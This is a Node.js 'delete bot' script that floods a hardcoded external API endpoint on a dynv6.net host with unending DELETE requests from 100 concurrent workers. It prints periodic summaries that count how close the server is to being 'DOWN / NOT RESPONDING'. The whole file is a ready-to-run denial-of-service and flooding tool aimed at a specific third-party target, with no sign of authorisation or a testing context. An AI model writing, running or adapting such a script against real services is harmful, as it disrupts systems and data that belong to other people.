/**
 * Delete bot - sends repeated DELETE requests to the target API.
 * Usage: node backend/bot.js
 */

const TARGET_URL = "https://farypor-api.dynv6.net/api/todos/3766";
const DELAY_MS = 5; // delay between requests (ms)
const CONCURRENCY = 100; // number of concurrent requests
const SUMMARY_INTERVAL_MS = 5000; // print summary every 5 seconds

let count = 0;
let errors = 0;
let totalResponseTime = 0;
let lastSummaryTime = Date.now();
const errorStats = {}; // track error types: { "404": 5, "ECONNREFUSED": 3 }

async function sendRequest() {
  const startTime = Date.now();
  try {
    const res = await fetch(TARGET_URL, {
      method: "DELETE",
    });
    const responseTime = Date.now() - startTime;
    const status = res.status;
    const text = await res.text().catch(() => "");
    return { ok: res.ok, status, text: text.slice(0, 200), responseTime };
  } catch (err) {
    const responseTime = Date.now() - startTime;
    const errCode = err.code || err.cause?.code || "UNKNOWN";
    return { ok: false, status: 0, text: `${errCode}: ${err.message}`, responseTime, errCode };
  }
}

function printSummary() {
  const now = Date.now();
  const elapsed = ((now - lastSummaryTime) / 1000).toFixed(1);
  const total = count;
  const successCount = total - errors;
  const successRate = total > 0 ? ((successCount / total) * 100).toFixed(1) : "0.0";
  const avgResponseTime = total > 0 ? (totalResponseTime / total).toFixed(0) : 0;
  const serverStatus = errors > total * 0.5
    ? "❌ SERVER DOWN / NOT RESPONDING"
    : errors > total * 0.1
      ? "⚠️  SERVER DEGRADED (high error rate)"
      : "✅ SERVER RESPONDING";

  console.log(`\n${"=".repeat(55)}`);
  console.log(`📊 SUMMARY (last ${elapsed}s)`);
  console.log(`   Total Requests : ${total}`);
  console.log(`   Successful     : ${successCount} (${successRate}%)`);
  console.log(`   Failed         : ${errors} (${(100 - parseFloat(successRate)).toFixed(1)}%)`);
  console.log(`   Avg Response   : ${avgResponseTime}ms`);
  console.log(`   Status         : ${serverStatus}`);

  // Show error breakdown
  if (Object.keys(errorStats).length > 0) {
    console.log(`   Error Breakdown:`);
    const sorted = Object.entries(errorStats).sort((a, b) => b[1] - a[1]).slice(0, 5);
    for (const [key, n] of sorted) {
      console.log(`     ${key}: ${n}`);
    }
  }
  console.log(`${"=".repeat(55)}\n`);

  lastSummaryTime = now;
}

async function spam() {
  console.log(`[DELETE BOT] Target: ${TARGET_URL}`);
  console.log(`[DELETE BOT] Concurrency: ${CONCURRENCY}, Delay: ${DELAY_MS}ms`);
  console.log(`[DELETE BOT] Summary every ${SUMMARY_INTERVAL_MS / 1000}s`);
  console.log("---");

  // Print summary on interval
  const summaryTimer = setInterval(printSummary, SUMMARY_INTERVAL_MS);

  // Fire concurrent requests in a loop
  const workers = Array.from({ length: CONCURRENCY }, async () => {
    while (true) {
      const result = await sendRequest();
      count++;
      totalResponseTime += result.responseTime;
      if (!result.ok) {
        errors++;
        // Track error type
        const key = result.status === 0
          ? (result.errCode || "NETWORK_ERROR")
          : `HTTP ${result.status}`;
        errorStats[key] = (errorStats[key] || 0) + 1;

        // Print first few errors for debugging
        if (errors <= 5) {
          console.log(`[ERROR #${errors}] Status: ${result.status} | Body: ${result.text}`);
        }
      }
      await new Promise((r) => setTimeout(r, DELAY_MS));
    }
  });

  await Promise.all(workers);
  clearInterval(summaryTimer);
}

spam().catch((e) => {
  console.error("Fatal error:", e.message);
  process.exit(1);
});